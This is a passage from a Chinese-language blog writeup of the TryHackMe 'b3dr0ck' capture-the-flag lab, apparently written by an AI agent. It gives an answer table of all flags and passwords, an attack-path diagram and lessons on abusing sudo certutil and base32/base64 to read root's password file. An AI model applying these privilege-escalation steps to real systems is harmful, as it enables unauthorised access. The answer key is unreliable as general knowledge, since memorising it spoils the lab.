+<h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><table>
+<thead>
+<tr>
+<th>问题</th>
+<th>答案</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>What is the barney.txt flag?</td>
+<td><code>THM&#123;f05780f08f0eb1de65023069d0e4c90c&#125;</code></td>
+</tr>
+<tr>
+<td>What is fred’s password?</td>
+<td><code>YabbaDabbaD0000!</code></td>
+</tr>
+<tr>
+<td>What is the fred.txt flag?</td>
+<td><code>THM&#123;08da34e619da839b154521da7323559d&#125;</code></td>
+</tr>
+<tr>
+<td>What is the root.txt flag?</td>
+<td><code>THM&#123;de4043c009214b56279982bf10a661b7&#125;</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="攻击路径图"><a href="#攻击路径图" class="headerlink" title="攻击路径图"></a>攻击路径图</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────────────┐</span><br><span class="line">│   端口扫描          │</span><br><span class="line">│   22, 80, 9009,     │</span><br><span class="line">│   4040, 54321       │</span><br><span class="line">└──────────┬──────────┘</span><br><span class="line">           │</span><br><span class="line">           ▼</span><br><span class="line">┌─────────────────────┐</span><br><span class="line">│   端口 9009         │</span><br><span class="line">│   获取 TLS 凭证     │</span><br><span class="line">│   (client.key,      │</span><br><span class="line">│    client.crt)      │</span><br><span class="line">└──────────┬──────────┘</span><br><span class="line">           │</span><br><span class="line">           ▼</span><br><span class="line">┌─────────────────────┐</span><br><span class="line">│   端口 54321        │</span><br><span class="line">│   使用 Barney 证书  │</span><br><span class="line">│   获取密码提示      │</span><br><span class="line">│   d1ad7c0a38...     │</span><br><span class="line">└──────────┬──────────┘</span><br><span class="line">           │</span><br><span class="line">           ▼</span><br><span class="line">┌─────────────────────┐</span><br><span class="line">│   SSH 登录 Barney   │</span><br><span class="line">│   获取 barney.txt   │</span><br><span class="line">│   THM&#123;f05780f0...&#125;  │</span><br><span class="line">└──────────┬──────────┘</span><br><span class="line">           │</span><br><span class="line">           ▼</span><br><span class="line">┌─────────────────────┐</span><br><span class="line">│   sudo certutil     │</span><br><span class="line">│   生成 Fred 证书    │</span><br><span class="line">└──────────┬──────────┘</span><br><span class="line">           │</span><br><span class="line">           ▼</span><br><span class="line">┌─────────────────────┐</span><br><span class="line">│   端口 54321        │</span><br><span class="line">│   使用 Fred 证书    │</span><br><span class="line">│   获取密码提示      │</span><br><span class="line">│   YabbaDabbaD0000!  │</span><br><span class="line">└──────────┬──────────┘</span><br><span class="line">           │</span><br><span class="line">           ▼</span><br><span class="line">┌─────────────────────┐</span><br><span class="line">│   SSH 登录 Fred     │</span><br><span class="line">│   获取 fred.txt     │</span><br><span class="line">│   THM&#123;08da34e6...&#125;  │</span><br><span class="line">└──────────┬──────────┘</span><br><span class="line">           │</span><br><span class="line">           ▼</span><br><span class="line">┌─────────────────────┐</span><br><span class="line">│   sudo base32/base64│</span><br><span class="line">│   读取 /root/pass.txt│</span><br><span class="line">│   三层编码解码      │</span><br><span class="line">│   flintstonesvitamins│</span><br><span class="line">└──────────┬──────────┘</span><br><span class="line">           │</span><br><span class="line">           ▼</span><br><span class="line">┌─────────────────────┐</span><br><span class="line">│   SSH 登录 Root     │</span><br><span class="line">│   获取 root.txt     │</span><br><span class="line">│   THM&#123;de4043c0...&#125;  │</span><br><span class="line">└─────────────────────┘</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h2><h3 id="1-密码破解失败"><a href="#1-密码破解失败" class="headerlink" title="1. 密码破解失败"></a>1. 密码破解失败</h3><p>一开始我尝试用 hashcat、john 等工具破解 Barney 的 MD5 哈希 <code>d1ad7c0a3805955a35eb260dab4180dd</code>，但都没有成功。后来发现这个哈希本身就是密码！</p>
+<p><strong>教训</strong>：有时候 CTF 的 trick 就是让你以为需要做复杂的操作，实际上答案就在眼前。</p>
+<h3 id="2-SSH-交互式登录"><a href="#2-SSH-交互式登录" class="headerlink" title="2. SSH 交互式登录"></a>2. SSH 交互式登录</h3><p>由于工具限制，无法直接进行交互式 SSH 登录。解决方法是使用 Python 的 paramiko 库来自动化 SSH 连接。</p>
+<h3 id="3-证书权限问题"><a href="#3-证书权限问题" class="headerlink" title="3. 证书权限问题"></a>3. 证书权限问题</h3><p>使用 certutil 生成的证书保存在 <code>/usr/share/abc/certs/</code> 目录，但当前用户没有读取权限。不过 certutil 在输出中打印了证书和密钥的内容，可以直接使用。</p>
+<h3 id="4-多层编码解码"><a href="#4-多层编码解码" class="headerlink" title="4. 多层编码解码"></a>4. 多层编码解码</h3><p>root 密码使用了三层编码：base32 → base32 → base64。一开始我只解码了一层，得到的还是编码的字符串，让我困惑了一段时间。</p>
+<p><strong>解决方法</strong>：继续解码，直到得到可读的字符串。</p>
+<hr>
+<h2 id="关键知识点"><a href="#关键知识点" class="headerlink" title="关键知识点"></a>关键知识点</h2><ol>
+<li><p><strong>TLS 客户端证书认证</strong>：靶场使用客户端证书进行身份验证，我们需要获取正确的证书才能访问服务。</p>
+</li>
+<li><p><strong>sudo 权限滥用</strong>：</p>
+<ul>
+<li>barney 可以运行 <code>certutil</code> 生成新证书</li>
+<li>fred 可以运行 <code>base32</code>&#x2F;<code>base64</code> 读取敏感文件</li>
+</ul>
+</li>
+<li><p><strong>编码绕过</strong>：通过 <code>base32</code>&#x2F;<code>base64</code> 命令读取受保护的文件，这是一种常见的权限绕过技术。</p>
+</li>
+<li><p><strong>信息收集的重要性</strong>：端口 9009 的服务是整个攻击链的起点，如果不仔细枚举端口，可能会错过它。</p>
+</li>
+</ol>
+<hr>
+<h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><ul>
+<li><strong>nmap</strong>: 端口扫描</li>
+<li><strong>netcat (nc)</strong>: 连接 TCP 服务，获取 TLS 凭证</li>
+<li><strong>openssl</strong>: TLS 连接和证书操作</li>
+<li><strong>ssh</strong>: 远程登录</li>
+<li><strong>paramiko</strong>: Python SSH 库（自动化攻击）</li>
+<li><strong>base32&#x2F;base64</strong>: 编码解码</li>
+</ul>
+<hr>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>b3dr0ck 是一个设计精巧的 CTF 靶场，将《摩登原始人》的主题融入到技术挑战中。整个攻击链清晰：</p>
+<ol>
+<li>从端口 9009 获取 TLS 凭证</li>
+<li>使用证书获取 Barney 的密码</li>
+<li>利用 sudo certutil 生成 Fred 的证书</li>
+<li>使用 Fred 的证书获取 Fred 的密码</li>
+<li>利用 sudo base32&#x2F;base64 读取 root 密码</li>
+<li>三层编码解码获取最终密码</li>
+</ol>
+<p>每一步都有明确的线索，但也有一定的 trick（比如 MD5 哈希本身就是密码）。靶场涵盖了信息收集、证书认证、sudo 权限分析、编码解码等多个知识点，是一个很好的入门级 CTF。</p>
+<hr>
+<p><strong>Writeup 作者</strong>: Claude Code</p>
+<p><strong>完成时间</strong>: 2026-06-04 18:14:19</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io">X9wd09ncc</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io/post/TryHackMe_b3dr0ck.html">https://x9wd09ncc.github.io/post/TryHackMe_b3dr0ck.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://x9wd09ncc.github.io" target="_blank">X9wd09ncc</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/thm/">thm</a><a class="post-meta__tags" href="/tags/easy/">easy</a><a class="post-meta__tags" href="/tags/%E7%BA%A2%E9%98%9F/">红队</a><a class="post-meta__tags" href="/tags/ai/">ai</a><a class="post-meta__tags" href="/tags/tls%E8%AF%81%E4%B9%A6/">TLS证书</a><a class="post-meta__tags" href="/tags/sudo%E6%8F%90%E6%9D%83/">sudo提权</a><a class="post-meta__tags" href="/tags/%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/">编码绕过</a><a class="post-meta__tags" href="/tags/ssh/">SSH</a><a class="post-meta__tags" href="/tags/flintstones/">Flintstones</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/TryHackMe_source.html" title="TryHackMe_source"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">TryHackMe_source</div></div></a></div><div class="next-post pull-right"><a href="/post/TryHackMe_GoldenEye.html" title="TryHackMe_GoldenEye"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">TryHackMe_GoldenEye</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/TryHackMe_GoldenEye.html" title="TryHackMe_GoldenEye"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-04</div><div class="title">TryHackMe_GoldenEye</div></div></a></div><div><a href="/post/TryHackMe_source.html" title="TryHackMe_source"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-04</div><div class="title">TryHackMe_source</div></div></a></div><div><a href="/post/TryHackMe_Agent_T.html" title="TryHackMe_Agent_T"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-25</div><div class="title">TryHackMe_Agent_T</div></div></a></div><div><a href="/post/TryHackMe_Anthem.html" title="TryHackMe_Anthem"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_Anthem</div></div></a></div><div><a href="/post/TryHackMe_Archangel.html" title="TryHackMe_Archangel"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-15</div><div class="title">TryHackMe_Archangel</div></div></a></div><div><a href="/post/TryHackMe_Blueprint.html" title="TryHackMe_Blueprint"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-12</div><div class="title">TryHackMe_Blueprint</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#TryHackMe-b3dr0ck-Writeup"><span class="toc-number">1.</span> <span class="toc-text">TryHackMe - b3dr0ck Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-%E6%9C%8D%E5%8A%A1%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.2.2.</span> <span class="toc-text">Web 服务探测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E6%8E%A2%E7%B4%A2%E7%AB%AF%E5%8F%A3-9009-%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.3.1.</span> <span class="toc-text">第一步：探索端口 9009 服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E8%8E%B7%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AF%81%E4%B9%A6"><span class="toc-number">1.3.2.</span> <span class="toc-text">第二步：获取客户端证书</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E8%8E%B7%E5%8F%96-Barney-%E7%9A%84%E5%AF%86%E7%A0%81"><span class="toc-number">1.3.3.</span> <span class="toc-text">第三步：获取 Barney 的密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9ASSH-%E7%99%BB%E5%BD%95-Barney"><span class="toc-number">1.3.4.</span> <span class="toc-text">第四步：SSH 登录 Barney</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E6%8F%90%E6%9D%83%E5%88%B0-Fred"><span class="toc-number">1.3.5.</span> <span class="toc-text">第五步：提权到 Fred</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E6%AD%A5%EF%BC%9A%E7%94%9F%E6%88%90-Fred-%E7%9A%84%E8%AF%81%E4%B9%A6"><span class="toc-number">1.3.6.</span> <span class="toc-text">第六步：生成 Fred 的证书</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%83%E6%AD%A5%EF%BC%9A%E8%8E%B7%E5%8F%96-Fred-%E7%9A%84%E5%AF%86%E7%A0%81"><span class="toc-number">1.3.7.</span> <span class="toc-text">第七步：获取 Fred 的密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%85%AB%E6%AD%A5%EF%BC%9A%E8%8E%B7%E5%8F%96-fred-txt"><span class="toc-number">1.3.8.</span> <span class="toc-text">第八步：获取 fred.txt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B9%9D%E6%AD%A5%EF%BC%9A%E6%8F%90%E6%9D%83%E5%88%B0-Root"><span class="toc-number">1.3.9.</span> <span class="toc-text">第九步：提权到 Root</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E6%AD%A5%EF%BC%9A%E8%A7%A3%E7%A0%81-root-%E5%AF%86%E7%A0%81"><span class="toc-number">1.3.10.</span> <span class="toc-text">第十步：解码 root 密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E4%B8%80%E6%AD%A5%EF%BC%9A%E8%8E%B7%E5%8F%96-root-txt"><span class="toc-number">1.3.11.</span> <span class="toc-text">第十一步：获取 root.txt</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%94%E6%A1%88"><span class="toc-number">1.4.</span> <span class="toc-text">答案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%B7%AF%E5%BE%84%E5%9B%BE"><span class="toc-number">1.5.</span> <span class="toc-text">攻击路径图</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95"><span class="toc-number">1.6.</span> <span class="toc-text">踩坑记录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E5%A4%B1%E8%B4%A5"><span class="toc-number">1.6.1.</span> <span class="toc-text">1. 密码破解失败</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-SSH-%E4%BA%A4%E4%BA%92%E5%BC%8F%E7%99%BB%E5%BD%95"><span class="toc-number">1.6.2.</span> <span class="toc-text">2. SSH 交互式登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%AF%81%E4%B9%A6%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98"><span class="toc-number">1.6.3.</span> <span class="toc-text">3. 证书权限问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%A4%9A%E5%B1%82%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81"><span class="toc-number">1.6.4.</span> <span class="toc-text">4. 多层编码解码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.7.</span> <span class="toc-text">关键知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-number">1.8.</span> <span class="toc-text">工具使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.9.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2026 By X9wd09ncc</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.bootcdn.net/ajax/libs/click-heart/1.0.0/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
